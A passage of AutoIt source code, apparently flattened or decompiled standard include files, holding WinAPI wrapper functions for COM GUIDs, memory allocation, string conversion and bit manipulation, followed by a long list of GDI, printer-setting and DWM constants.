		Return BitOR(BitShift(DllStructGetData($tosvi, 2), -8), DllStructGetData($tosvi, 3))
	EndFunc

#EndRegion Internal Functions
#Region Global Variables and Constants
	Global Const $__tagwinapicom_guid = "struct;ulong Data1;ushort Data2;ushort Data3;byte Data4[8];endstruct"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_clsidfromprogid($sprogid)
		Local $tguid = DllStructCreate($__tagwinapicom_guid)
		Local $areturn = DllCall("ole32.dll", "long", "CLSIDFromProgID", "wstr", $sprogid, "struct*", $tguid)
		If @error Then Return SetError(@error, @extended, "")
		If $areturn[0] Then Return SetError(10, $areturn[0], "")
		$areturn = DllCall("ole32.dll", "int", "StringFromGUID2", "struct*", $tguid, "wstr", "", "int", 39)
		If @error OR NOT $areturn[0] Then Return SetError(@error + 20, @extended, "")
		Return $areturn[2]
	EndFunc

	Func _winapi_coinitialize($iflags = 0)
		Local $areturn = DllCall("ole32.dll", "long", "CoInitializeEx", "ptr", 0, "dword", $iflags)
		If @error Then Return SetError(@error, @extended, 0)
		If $areturn[0] Then Return SetError(10, $areturn[0], 0)
		Return 1
	EndFunc

	Func _winapi_cotaskmemalloc($isize)
		Local $areturn = DllCall("ole32.dll", "ptr", "CoTaskMemAlloc", "uint_ptr", $isize)
		If @error Then Return SetError(@error, @extended, 0)
		Return $areturn[0]
	EndFunc

	Func _winapi_cotaskmemfree($pmemory)
		DllCall("ole32.dll", "none", "CoTaskMemFree", "ptr", $pmemory)
		If @error Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

	Func _winapi_cotaskmemrealloc($pmemory, $isize)
		Local $areturn = DllCall("ole32.dll", "ptr", "CoTaskMemRealloc", "ptr", $pmemory, "ulong_ptr", $isize)
		If @error Then Return SetError(@error, @extended, 0)
		Return $areturn[0]
	EndFunc

	Func _winapi_couninitialize()
		DllCall("ole32.dll", "none", "CoUninitialize")
		If @error Then Return SetError(@error, @extended, 0)
		Return 1
	EndFunc

	Func _winapi_createguid()
		Local $tguid = DllStructCreate($__tagwinapicom_guid)
		Local $areturn = DllCall("ole32.dll", "long", "CoCreateGuid", "struct*", $tguid)
		If @error Then Return SetError(@error, @extended, "")
		If $areturn[0] Then Return SetError(10, $areturn[0], "")
		$areturn = DllCall("ole32.dll", "int", "StringFromGUID2", "struct*", $tguid, "wstr", "", "int", 65536)
		If @error OR NOT $areturn[0] Then Return SetError(@error + 20, @extended, "")
		Return $areturn[2]
	EndFunc

	Func _winapi_createstreamonhglobal($hglobal = 0, $bdeleteonrelease = True)
		Local $areturn = DllCall("ole32.dll", "long", "CreateStreamOnHGlobal", "handle", $hglobal, "bool", $bdeleteonrelease, "ptr*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $areturn[0] Then Return SetError(10, $areturn[0], 0)
		Return $areturn[3]
	EndFunc

	Func _winapi_gethglobalfromstream($pstream)
		Local $areturn = DllCall("ole32.dll", "uint", "GetHGlobalFromStream", "ptr", $pstream, "ptr*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $areturn[0] Then Return SetError(10, $areturn[0], 0)
		Return $areturn[2]
	EndFunc

	Func _winapi_progidfromclsid($sclsid)
		Local $tguid = DllStructCreate($__tagwinapicom_guid)
		Local $areturn = DllCall("ole32.dll", "uint", "CLSIDFromString", "wstr", $sclsid, "struct*", $tguid)
		If @error OR $areturn[0] Then Return SetError(@error + 20, @extended, "")
		$areturn = DllCall("ole32.dll", "uint", "ProgIDFromCLSID", "struct*", $tguid, "ptr*", 0)
		If @error Then Return SetError(@error, @extended, "")
		If $areturn[0] Then Return SetError(10, $areturn[0], "")
		Local $sid = _winapi_getstring($areturn[2])
		_winapi_cotaskmemfree($areturn[2])
		Return $sid
	EndFunc

	Func _winapi_releasestream($pstream)
		Local $areturn = DllCall("oleaut32.dll", "long", "DispCallFunc", "ptr", $pstream, "ulong_ptr", 8 * (1 + @AutoItX64), "uint", 4, "ushort", 23, "uint", 0, "ptr", 0, "ptr", 0, "str", "")
		If @error Then Return SetError(@error, @extended, 0)
		If $areturn[0] Then Return SetError(10, $areturn[0], 0)
		Return 1
	EndFunc

#EndRegion Public Functions
#Region Global Variables and Constants
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_chartooem($sstr)
		Local $aret = DllCall("user32.dll", "bool", "CharToOemW", "wstr", $sstr, "wstr", "")
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_clienttoscreen($hwnd, ByRef $tpoint)
		Local $aret = DllCall("user32.dll", "bool", "ClientToScreen", "hwnd", $hwnd, "struct*", $tpoint)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $tpoint
	EndFunc

	Func _winapi_dwordtofloat($ivalue)
		Local $tdword = DllStructCreate("dword")
		Local $tfloat = DllStructCreate("float", DllStructGetPtr($tdword))
		DllStructSetData($tdword, 1, $ivalue)
		Return DllStructGetData($tfloat, 1)
	EndFunc

	Func _winapi_dwordtoint($ivalue)
		Local $tdata = DllStructCreate("int")
		DllStructSetData($tdata, 1, $ivalue)
		Return DllStructGetData($tdata, 1)
	EndFunc

	Func _winapi_floattodword($ivalue)
		Local $tfloat = DllStructCreate("float")
		Local $tdword = DllStructCreate("dword", DllStructGetPtr($tfloat))
		DllStructSetData($tfloat, 1, $ivalue)
		Return DllStructGetData($tdword, 1)
	EndFunc

	Func _winapi_floattoint($nfloat)
		Local $tfloat = DllStructCreate("float")
		Local $tint = DllStructCreate("int", DllStructGetPtr($tfloat))
		DllStructSetData($tfloat, 1, $nfloat)
		Return DllStructGetData($tint, 1)
	EndFunc

	Func _winapi_getxyfrompoint(ByRef $tpoint, ByRef $ix, ByRef $iy)
		$ix = DllStructGetData($tpoint, "X")
		$iy = DllStructGetData($tpoint, "Y")
	EndFunc

	Func _winapi_guidfromstring($sguid)
		Local $tguid = DllStructCreate($tagguid)
		_winapi_guidfromstringex($sguid, $tguid)
		If @error Then Return SetError(@error + 10, @extended, 0)
		Return $tguid
	EndFunc

	Func _winapi_guidfromstringex($sguid, $tguid)
		Local $aresult = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", $sguid, "struct*", $tguid)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_hashdata($pmemory, $isize, $ilength = 32)
		If ($ilength <= 0) OR ($ilength > 256) Then Return SetError(11, 0, 0)
		Local $tdata = DllStructCreate("byte[" & $ilength & "]")
		Local $aret = DllCall("shlwapi.dll", "uint", "HashData", "struct*", $pmemory, "dword", $isize, "struct*", $tdata, "dword", $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return DllStructGetData($tdata, 1)
	EndFunc

	Func _winapi_hashstring($sstring, $bcasesensitive = True, $ilength = 32)
		Local $ilengths = StringLen($sstring)
		If NOT $ilengths OR ($ilength > 256) Then Return SetError(12, 0, 0)
		Local $tstring = DllStructCreate("wchar[" & ($ilengths + 1) & "]")
		If NOT $bcasesensitive Then
			$sstring = StringLower($sstring)
		EndIf
		DllStructSetData($tstring, 1, $sstring)
		Local $shash = _winapi_hashdata($tstring, 2 * $ilengths, $ilength)
		If @error Then Return SetError(@error, @extended, 0)
		Return $shash
	EndFunc

	Func _winapi_hibyte($ivalue)
		Return BitAND(BitShift($ivalue, 8), 255)
	EndFunc

	Func _winapi_hidword($ivalue)
		Local $tint64 = DllStructCreate("int64")
		Local $tqword = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
		DllStructSetData($tint64, 1, $ivalue)
		Return DllStructGetData($tqword, 2)
	EndFunc

	Func _winapi_hiword($ilong)
		Return BitShift($ilong, 16)
	EndFunc

	Func _winapi_inttodword($ivalue)
		Local $tdata = DllStructCreate("dword")
		DllStructSetData($tdata, 1, $ivalue)
		Return DllStructGetData($tdata, 1)
	EndFunc

	Func _winapi_inttofloat($iint)
		Local $tint = DllStructCreate("int")
		Local $tfloat = DllStructCreate("float", DllStructGetPtr($tint))
		DllStructSetData($tint, 1, $iint)
		Return DllStructGetData($tfloat, 1)
	EndFunc

	Func _winapi_lobyte($ivalue)
		Return BitAND($ivalue, 255)
	EndFunc

	Func _winapi_lodword($ivalue)
		Local $tint64 = DllStructCreate("int64")
		Local $tqword = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
		DllStructSetData($tint64, 1, $ivalue)
		Return DllStructGetData($tqword, 1)
	EndFunc

	Func _winapi_loword($ilong)
		Return BitAND($ilong, 65535)
	EndFunc

	Func _winapi_longmid($ivalue, $istart, $icount)
		Return BitAND(BitShift($ivalue, $istart), BitOR(BitShift(BitShift(2147483647, 32 - ($icount + 1)), 1), BitShift(1, -($icount - 1))))
	EndFunc

	Func _winapi_makelangid($ilngidprimary, $ilngidsub)
		Return BitOR(BitShift($ilngidsub, -10), $ilngidprimary)
	EndFunc

	Func _winapi_makelcid($ilngid, $isortid)
		Return BitOR(BitShift($isortid, -16), $ilngid)
	EndFunc

	Func _winapi_makelong($ilo, $ihi)
		Return BitOR(BitShift($ihi, -16), BitAND($ilo, 65535))
	EndFunc

	Func _winapi_makeqword($ilodword, $ihidword)
		Local $tint64 = DllStructCreate("uint64")
		Local $tdwords = DllStructCreate("dword;dword", DllStructGetPtr($tint64))
		DllStructSetData($tdwords, 1, $ilodword)
		DllStructSetData($tdwords, 2, $ihidword)
		Return DllStructGetData($tint64, 1)
	EndFunc

	Func _winapi_makeword($ilo, $ihi)
		Local $tword = DllStructCreate("ushort")
		Local $tbyte = DllStructCreate("byte;byte", DllStructGetPtr($tword))
		DllStructSetData($tbyte, 1, $ihi)
		DllStructSetData($tbyte, 2, $ilo)
		Return DllStructGetData($tword, 1)
	EndFunc

	Func _winapi_multibytetowidechar($vtext, $icodepage = 0, $iflags = 0, $bretstring = False)
		Local $stexttype = "str"
		If NOT IsString($vtext) Then $stexttype = "struct*"
		Local $aresult = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $vtext, "int", -1, "ptr", 0, "int", 0)
		If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, 0)
		Local $iout = $aresult[0]
		Local $tout = DllStructCreate("wchar[" & $iout & "]")
		$aresult = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, $stexttype, $vtext, "int", -1, "struct*", $tout, "int", $iout)
		If @error OR NOT $aresult[0] Then Return SetError(@error + 20, @extended, 0)
		If $bretstring Then Return DllStructGetData($tout, 1)
		Return $tout
	EndFunc

	Func _winapi_multibytetowidecharex($stext, $ptext, $icodepage = 0, $iflags = 0)
		Local $aresult = DllCall("kernel32.dll", "int", "MultiByteToWideChar", "uint", $icodepage, "dword", $iflags, "STR", $stext, "int", -1, "struct*", $ptext, "int", (StringLen($stext) + 1) * 2)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_oemtochar($sstr)
		Local $aret = DllCall("user32.dll", "bool", "OemToChar", "str", $sstr, "str", "")
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_pointfromrect(ByRef $trect, $bcenter = True)
		Local $ix1 = DllStructGetData($trect, "Left")
		Local $iy1 = DllStructGetData($trect, "Top")
		Local $ix2 = DllStructGetData($trect, "Right")
		Local $iy2 = DllStructGetData($trect, "Bottom")
		If $bcenter Then
			$ix1 = $ix1 + (($ix2 - $ix1) / 2)
			$iy1 = $iy1 + (($iy2 - $iy1) / 2)
		EndIf
		Local $tpoint = DllStructCreate($tagpoint)
		DllStructSetData($tpoint, "X", $ix1)
		DllStructSetData($tpoint, "Y", $iy1)
		Return $tpoint
	EndFunc

	Func _winapi_primarylangid($ilngid)
		Return BitAND($ilngid, 1023)
	EndFunc

	Func _winapi_screentoclient($hwnd, ByRef $tpoint)
		Local $aresult = DllCall("user32.dll", "bool", "ScreenToClient", "hwnd", $hwnd, "struct*", $tpoint)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_shorttoword($ivalue)
		Return BitAND($ivalue, 65535)
	EndFunc

	Func _winapi_strformatbytesize($isize)
		Local $aret = DllCall("shlwapi.dll", "ptr", "StrFormatByteSizeW", "int64", $isize, "wstr", "", "uint", 1024)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_strformatbytesizeex($isize)
		Local $asymbol = DllCall("kernel32.dll", "int", "GetLocaleInfoW", "dword", 1024, "dword", 15, "wstr", "", "int", 2048)
		If @error Then Return SetError(@error + 10, @extended, "")
		Local $ssize = _winapi_strformatbytesize(0)
		If @error Then Return SetError(@error, @extended, "")
		Return StringReplace($ssize, "0", StringRegExpReplace(Number($isize), "(?<=\d)(?=(\d{3})+\z)", $asymbol[3]))
	EndFunc

	Func _winapi_strformatkbsize($isize)
		Local $aret = DllCall("shlwapi.dll", "ptr", "StrFormatKBSizeW", "int64", $isize, "wstr", "", "uint", 1024)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return $aret[2]
	EndFunc

	Func _winapi_strfromtimeinterval($itime, $idigits = 7)
		Local $aret = DllCall("shlwapi.dll", "int", "StrFromTimeIntervalW", "wstr", "", "uint", 1024, "dword", $itime, "int", $idigits)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, "")
		Return StringStripWS($aret[1], $str_stripleading + $str_striptrailing)
	EndFunc

	Func _winapi_stringfromguid($tguid)
		Local $aresult = DllCall("ole32.dll", "int", "StringFromGUID2", "struct*", $tguid, "wstr", "", "int", 40)
		If @error OR NOT $aresult[0] Then Return SetError(@error, @extended, "")
		Return SetExtended($aresult[0], $aresult[2])
	EndFunc

	Func _winapi_sublangid($ilngid)
		Return BitShift($ilngid, 10)
	EndFunc

	Func _winapi_swapdword($ivalue)
		Local $tstruct1 = DllStructCreate("dword;dword")
		Local $tstruct2 = DllStructCreate("byte[4];byte[4]", DllStructGetPtr($tstruct1))
		DllStructSetData($tstruct1, 1, $ivalue)
		For $i = 1 To 4
			DllStructSetData($tstruct2, 2, DllStructGetData($tstruct2, 1, 5 - $i), $i)
		Next
		Return DllStructGetData($tstruct1, 2)
	EndFunc

	Func _winapi_swapqword($ivalue)
		Local $tstruct1 = DllStructCreate("int64;int64")
		Local $tstruct2 = DllStructCreate("byte[8];byte[8]", DllStructGetPtr($tstruct1))
		DllStructSetData($tstruct1, 1, $ivalue)
		For $i = 1 To 8
			DllStructSetData($tstruct2, 2, DllStructGetData($tstruct2, 1, 9 - $i), $i)
		Next
		Return DllStructGetData($tstruct1, 2)
	EndFunc

	Func _winapi_swapword($ivalue)
		Local $tstruct1 = DllStructCreate("word;word")
		Local $tstruct2 = DllStructCreate("byte[2];byte[2]", DllStructGetPtr($tstruct1))
		DllStructSetData($tstruct1, 1, $ivalue)
		For $i = 1 To 2
			DllStructSetData($tstruct2, 2, DllStructGetData($tstruct2, 1, 3 - $i), $i)
		Next
		Return DllStructGetData($tstruct1, 2)
	EndFunc

	Func _winapi_widechartomultibyte($vunicode, $icodepage = 0, $bretnostruct = True, $bretbinary = False)
		Local $sunicodetype = "wstr"
		If NOT IsString($vunicode) Then $sunicodetype = "struct*"
		Local $aresult = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0, $sunicodetype, $vunicode, "int", -1, "ptr", 0, "int", 0, "ptr", 0, "ptr", 0)
		If @error OR NOT $aresult[0] Then Return SetError(@error + 20, @extended, "")
		Local $tmultibyte = DllStructCreate((($bretbinary) ? ("byte") : ("char")) & "[" & $aresult[0] & "]")
		$aresult = DllCall("kernel32.dll", "int", "WideCharToMultiByte", "uint", $icodepage, "dword", 0, $sunicodetype, $vunicode, "int", -1, "struct*", $tmultibyte, "int", $aresult[0], "ptr", 0, "ptr", 0)
		If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, "")
		If $bretnostruct Then Return DllStructGetData($tmultibyte, 1)
		Return $tmultibyte
	EndFunc

	Func _winapi_wordtoshort($ivalue)
		If BitAND($ivalue, 32768) Then
			Return BitOR($ivalue, -32768)
		EndIf
		Return BitAND($ivalue, 32767)
	EndFunc

#EndRegion Public Functions
Global Const $fr_private = 16
Global Const $fr_not_enum = 32
Global Const $compression_bitmap_png = 0
Global Const $compression_bitmap_jpeg = 1
Global Const $bs_dibpattern = 5
Global Const $bs_dibpattern8x8 = 8
Global Const $bs_dibpatternpt = 6
Global Const $bs_hatched = 2
Global Const $bs_hollow = 1
Global Const $bs_null = 1
Global Const $bs_pattern = 3
Global Const $bs_pattern8x8 = 7
Global Const $bs_solid = 0
Global Const $hs_bdiagonal = 3
Global Const $hs_cross = 4
Global Const $hs_diagcross = 5
Global Const $hs_fdiagonal = 2
Global Const $hs_horizontal = 0
Global Const $hs_vertical = 1
Global Const $dib_pal_colors = 1
Global Const $dib_rgb_colors = 0
Global Const $ca_negative = 1
Global Const $ca_log_filter = 2
Global Const $illuminant_device_default = 0
Global Const $illuminant_a = 1
Global Const $illuminant_b = 2
Global Const $illuminant_c = 3
Global Const $illuminant_d50 = 4
Global Const $illuminant_d55 = 5
Global Const $illuminant_d65 = 6
Global Const $illuminant_d75 = 7
Global Const $illuminant_f2 = 8
Global Const $illuminant_tungsten = $illuminant_a
Global Const $illuminant_daylight = $illuminant_c
Global Const $illuminant_fluorescent = $illuminant_f2
Global Const $illuminant_ntsc = $illuminant_c
Global Const $bi_rgb = 0
Global Const $bi_rle8 = 1
Global Const $bi_rle4 = 2
Global Const $bi_bitfields = 3
Global Const $bi_jpeg = 4
Global Const $bi_png = 5
Global Const $alternate = 1
Global Const $winding = 2
Global Const $dwmwa_ncrendering_enabled = 1
Global Const $dwmwa_ncrendering_policy = 2
Global Const $dwmwa_transitions_forcedisabled = 3
Global Const $dwmwa_allow_ncpaint = 4
Global Const $dwmwa_caption_button_bounds = 5
Global Const $dwmwa_nonclient_rtl_layout = 6
Global Const $dwmwa_force_iconic_representation = 7
Global Const $dwmwa_flip3d_policy = 8
Global Const $dwmwa_extended_frame_bounds = 9
Global Const $dwmwa_has_iconic_bitmap = 10
Global Const $dwmwa_disallow_peek = 11
Global Const $dwmwa_excluded_from_peek = 12
Global Const $dwmncrp_usewindowstyle = 0
Global Const $dwmncrp_disabled = 1
Global Const $dwmncrp_enabled = 2
Global Const $dwmflip3d_default = 0
Global Const $dwmflip3d_excludebelow = 1
Global Const $dwmflip3d_excludeabove = 2
Global Const $dm_bitsperpel = 262144
Global Const $dm_collate = 32768
Global Const $dm_color = 2048
Global Const $dm_copies = 256
Global Const $dm_defaultsource = 512
Global Const $dm_displayfixedoutput = 536870912
Global Const $dm_displayflags = 2097152
Global Const $dm_displayfrequency = 4194304
Global Const $dm_displayorientation = 128
Global Const $dm_dithertype = 67108864
Global Const $dm_duplex = 4096
Global Const $dm_formname = 65536
Global Const $dm_icmintent = 16777216
Global Const $dm_icmmethod = 8388608
Global Const $dm_logpixels = 131072
Global Const $dm_mediatype = 33554432
Global Const $dm_nup = 64
Global Const $dm_orientation = 1
Global Const $dm_panningheight = 268435456
Global Const $dm_panningwidth = 134217728
Global Const $dm_paperlength = 4
Global Const $dm_papersize = 2
Global Const $dm_paperwidth = 8
Global Const $dm_pelsheight = 1048576
Global Const $dm_pelswidth = 524288
Global Const $dm_position = 32
Global Const $dm_printquality = 1024
Global Const $dm_scale = 16
Global Const $dm_ttoption = 16384
Global Const $dm_yresolution = 8192
Global Const $dmpaper_letter = 1
Global Const $dmpaper_lettersmall = 2
Global Const $dmpaper_tabloid = 3
Global Const $dmpaper_ledger = 4
Global Const $dmpaper_legal = 5
Global Const $dmpaper_statement = 6
Global Const $dmpaper_executive = 7
Global Const $dmpaper_a3 = 8
Global Const $dmpaper_a4 = 9
Global Const $dmpaper_a4small = 10
Global Const $dmpaper_a5 = 11
Global Const $dmpaper_b4 = 12
Global Const $dmpaper_b5 = 13
Global Const $dmpaper_folio = 14
Global Const $dmpaper_quarto = 15
Global Const $dmpaper_10x14 = 16
Global Const $dmpaper_11x17 = 17
Global Const $dmpaper_note = 18
Global Const $dmpaper_env_9 = 19
Global Const $dmpaper_env_10 = 20
Global Const $dmpaper_env_11 = 21
Global Const $dmpaper_env_12 = 22
Global Const $dmpaper_env_14 = 23
Global Const $dmpaper_csheet = 24
Global Const $dmpaper_dsheet = 25
Global Const $dmpaper_esheet = 26
Global Const $dmpaper_env_dl = 27
Global Const $dmpaper_env_c5 = 28
Global Const $dmpaper_env_c3 = 29
Global Const $dmpaper_env_c4 = 30
Global Const $dmpaper_env_c6 = 31
Global Const $dmpaper_env_c65 = 32
Global Const $dmpaper_env_b4 = 33
Global Const $dmpaper_env_b5 = 34
Global Const $dmpaper_env_b6 = 35
Global Const $dmpaper_env_italy = 36
Global Const $dmpaper_env_monarch = 37
Global Const $dmpaper_env_personal = 38
Global Const $dmpaper_fanfold_us = 39
Global Const $dmpaper_fanfold_std_german = 40
Global Const $dmpaper_fanfold_lgl_german = 41
Global Const $dmpaper_iso_b4 = 42
Global Const $dmpaper_japanese_postcard = 43
Global Const $dmpaper_9x11 = 44
Global Const $dmpaper_10x11 = 45
Global Const $dmpaper_15x11 = 46
Global Const $dmpaper_env_invite = 47
Global Const $dmpaper_reserved_48 = 48
Global Const $dmpaper_reserved_49 = 49
Global Const $dmpaper_letter_extra = 50
Global Const $dmpaper_legal_extra = 51
Global Const $dmpaper_tabloid_extra = 52
Global Const $dmpaper_a4_extra = 53
Global Const $dmpaper_letter_transverse = 54
Global Const $dmpaper_a4_transverse = 55
Global Const $dmpaper_letter_extra_transverse = 56
Global Const $dmpaper_a_plus = 57
Global Const $dmpaper_b_plus = 58
Global Const $dmpaper_letter_plus = 59
Global Const $dmpaper_a4_plus = 60
Global Const $dmpaper_a5_transverse = 61
Global Const $dmpaper_b5_transverse = 62
Global Const $dmpaper_a3_extra = 63
Global Const $dmpaper_a5_extra = 64
Global Const $dmpaper_b5_extra = 65
Global Const $dmpaper_a2 = 66
Global Const $dmpaper_a3_transverse = 67
Global Const $dmpaper_a3_extra_transverse = 68
Global Const $dmpaper_dbl_japanese_postcard = 69
Global Const $dmpaper_a6 = 70
Global Const $dmpaper_jenv_kaku2 = 71
Global Const $dmpaper_jenv_kaku3 = 72
Global Const $dmpaper_jenv_chou3 = 73
Global Const $dmpaper_jenv_chou4 = 74
Global Const $dmpaper_letter_rotated = 75
Global Const $dmpaper_a3_rotated = 76
Global Const $dmpaper_a4_rotated = 77
Global Const $dmpaper_a5_rotated = 78
Global Const $dmpaper_b4_jis_rotated = 79
Global Const $dmpaper_b5_jis_rotated = 80
Global Const $dmpaper_japanese_postcard_rotated = 81
Global Const $dmpaper_dbl_japanese_postcard_rotated = 82
Global Const $dmpaper_a6_rotated = 83
Global Const $dmpaper_jenv_kaku2_rotated = 84
Global Const $dmpaper_jenv_kaku3_rotated = 85
Global Const $dmpaper_jenv_chou3_rotated = 86
Global Const $dmpaper_jenv_chou4_rotated = 87
Global Const $dmpaper_b6_jis = 88
Global Const $dmpaper_b6_jis_rotated = 89
Global Const $dmpaper_12x11 = 90
Global Const $dmpaper_jenv_you4 = 91
Global Const $dmpaper_jenv_you4_rotated = 92
Global Const $dmpaper_p16k = 93
Global Const $dmpaper_p32k = 94
Global Const $dmpaper_p32kbig = 95
Global Const $dmpaper_penv_1 = 96
Global Const $dmpaper_penv_2 = 97
Global Const $dmpaper_penv_3 = 98
Global Const $dmpaper_penv_4 = 99
Global Const $dmpaper_penv_5 = 100
Global Const $dmpaper_penv_6 = 101
Global Const $dmpaper_penv_7 = 102
Global Const $dmpaper_penv_8 = 103
Global Const $dmpaper_penv_9 = 104
Global Const $dmpaper_penv_10 = 105
Global Const $dmpaper_p16k_rotated = 106
Global Const $dmpaper_p32k_rotated = 107
Global Const $dmpaper_p32kbig_rotated = 108
Global Const $dmpaper_penv_1_rotated = 109
Global Const $dmpaper_penv_2_rotated = 110
Global Const $dmpaper_penv_3_rotated = 111
Global Const $dmpaper_penv_4_rotated = 112
Global Const $dmpaper_penv_5_rotated = 113
Global Const $dmpaper_penv_6_rotated = 114
Global Const $dmpaper_penv_7_rotated = 115
Global Const $dmpaper_penv_8_rotated = 116
Global Const $dmpaper_penv_9_rotated = 117
Global Const $dmpaper_penv_10_rotated = 118
Global Const $dmpaper_user = 256
Global Const $dmbin_upper = 1
Global Const $dmbin_lower = 2
Global Const $dmbin_middle = 3
Global Const $dmbin_manual = 4
Global Const $dmbin_envelope = 5
Global Const $dmbin_envmanual = 6
Global Const $dmbin_auto = 7
Global Const $dmbin_tractor = 8
Global Const $dmbin_smallfmt = 9
Global Const $dmbin_largefmt = 10
Global Const $dmbin_largecapacity = 11
Global Const $dmbin_cassette = 14
Global Const $dmbin_formsource = 15
Global Const $dmbin_user = 256
Global Const $dmres_draft = -1
Global Const $dmres_low = -2
Global Const $dmres_medium = -3
Global Const $dmres_high = -4
Global Const $dmdo_default = 0
Global Const $dmdo_90 = 1
Global Const $dmdo_180 = 2
Global Const $dmdo_270 = 3
Global Const $dmdfo_default = 0
Global Const $dmdfo_stretch = 1
Global Const $dmdfo_center = 2
Global Const $dmcolor_monochrome = 1
Global Const $dmcolor_color = 2
Global Const $dmdup_simplex = 1
Global Const $dmdup_vertical = 2
Global Const $dmdup_horizontal = 3
Global Const $dmtt_bitmap = 1
Global Const $dmtt_download = 2
Global Const $dmtt_subdev = 3
Global Const $dmtt_download_outline = 4
Global Const $dmcollate_false = 0
Global Const $dmcollate_true = 1
Global Const $dm_grayscale = 1
Global Const $dm_interlaced = 2
Global Const $dmnup_system = 1
Global Const $dmnup_oneup = 2
Global Const $dmicmmethod_none = 1
Global Const $dmicmmethod_system = 2
Global Const $dmicmmethod_driver = 3
Global Const $dmicmmethod_device = 4
Global Const $dmicmmethod_user = 256
Global Const $dmicm_saturate = 1
Global Const $dmicm_contrast = 2
Global Const $dmicm_colorimetric = 3
Global Const $dmicm_abs_colorimetric = 4
Global Const $dmicm_user = 256
Global Const $dmmedia_standard = 1
Global Const $dmmedia_transparency = 2
Global Const $dmmedia_glossy = 3
Global Const $dmmedia_user = 256
Global Const $dmdither_none = 1
Global Const $dmdither_coarse = 2
Global Const $dmdither_fine = 3
Global Const $dmdither_lineart = 4
Global Const $dmdither_errordiffusion = 5
Global Const $dmdither_reserved6 = 6
Global Const $dmdither_reserved7 = 7
Global Const $dmdither_reserved8 = 8
Global Const $dmdither_reserved9 = 9
Global Const $dmdither_grayscale = 10
Global Const $dmdither_user = 256
Global Const $enum_current_settings = -1
Global Const $enum_registry_settings = -2
Global Const $device_fonttype = 2
Global Const $raster_fonttype = 1
Global Const $truetype_fonttype = 4
Global Const $ntm_bold = 32
Global Const $ntm_dsig = 2097152
Global Const $ntm_italic = 1
Global Const $ntm_multiplemaster = 524288
Global Const $ntm_nonnegative_ac = 65536
Global Const $ntm_ps_opentype = 131072
Global Const $ntm_regular = 64
Global Const $ntm_tt_opentype = 262144
Global Const $ntm_type1 = 1048576
Global Const $floodfillborder = 0
Global Const $floodfillsurface = 1
Global Const $ad_counterclockwise = 1
Global Const $ad_clockwise = 2
Global Const $dcb_accumulate = 2
Global Const $dcb_disable = 8
Global Const $dcb_enable = 4
Global Const $dcb_reset = 1
Global Const $dcb_set = BitOR($dcb_reset, $dcb_accumulate)
Global Const $dcx_window = 1
Global Const $dcx_cache = 2
Global Const $dcx_parentclip = 32
Global Const $dcx_clipsiblings = 16
Global Const $dcx_clipchildren = 8
Global Const $dcx_noresetattrs = 4
Global Const $dcx_lockwindowupdate = 1024
Global Const $dcx_excludergn = 64
Global Const $dcx_intersectrgn = 128
Global Const $dcx_intersectupdate = 512
Global Const $dcx_validate = 2097152
Global Const $ggo_bezier = 3
Global Const $ggo_bitmap = 1
Global Const $ggo_glyph_index = 128
Global Const $ggo_gray2_bitmap = 4
Global Const $ggo_gray4_bitmap = 5
Global Const $ggo_gray8_bitmap = 6
Global Const $ggo_metrics = 0
Global Const $ggo_native = 2
Global Const $ggo_unhinted = 256
Global Const $gm_compatible = 1
Global Const $gm_advanced = 2
Global Const $mm_anisotropic = 8
Global Const $mm_hienglish = 5
Global Const $mm_himetric = 3
Global Const $mm_isotropic = 7
Global Const $mm_loenglish = 4
Global Const $mm_lometric = 2
Global Const $mm_text = 1
Global Const $mm_twips = 6
Global Const $r2_black = 1
Global Const $r2_copypen = 13
Global Const $r2_last = 16
Global Const $r2_masknotpen = 3
Global Const $r2_maskpen = 9
Global Const $r2_maskpennot = 5
Global Const $r2_mergenotpen = 12
Global Const $r2_mergepen = 15
Global Const $r2_mergepennot = 14
Global Const $r2_nop = 11
Global Const $r2_not = 6
Global Const $r2_notcopypen = 4
Global Const $r2_notmaskpen = 8
Global Const $r2_notmergepen = 2
Global Const $r2_notxorpen = 10
Global Const $r2_white = 16
Global Const $r2_xorpen = 7
Global Const $blackonwhite = 1
Global Const $coloroncolor = 3
Global Const $halftone = 4
Global Const $whiteonblack = 2
Global Const $stretch_andscans = $blackonwhite
Global Const $stretch_deletescans = $coloroncolor
Global Const $stretch_halftone = $halftone
Global Const $stretch_orscans = $whiteonblack
Global Const $ta_baseline = 24
Global Const $ta_bottom = 8
Global Const $ta_top = 0
Global Const $ta_center = 6
Global Const $ta_left = 0
Global Const $ta_right = 2
Global Const $ta_noupdatecp = 0
Global Const $ta_rtlreading = 256
Global Const $ta_updatecp = 1
Global Const $vta_baseline = $ta_baseline
Global Const $vta_bottom = $ta_right
Global Const $vta_top = $ta_left
Global Const $vta_center = $ta_center
